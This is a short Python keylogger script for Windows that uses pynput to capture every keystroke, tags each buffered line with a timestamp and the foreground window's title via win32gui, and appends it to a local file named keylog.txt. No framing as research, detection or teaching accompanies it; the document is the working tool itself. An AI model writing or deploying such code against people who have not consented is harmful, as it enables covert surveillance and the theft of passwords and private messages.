from pynput import keyboard
from datetime import datetime
import win32gui

log_file = "keylog.txt"
buffer = []

def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def write_buffer():
    if buffer:
        window = get_active_window_title()
        with open(log_file, "a") as f:
            f.write(f"\n{datetime.now()} | {window} | {''.join(buffer)}\n")

def on_press(key):
    global buffer
    try:
        if key == keyboard.Key.enter or key == keyboard.Key.backspace:
            write_buffer()
            buffer = []  # clear after writing
        elif hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)
        else:
            # Optional: include this if you want special keys noted
            buffer.append(f'[{key.name}]')
    except Exception as e:
        pass

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
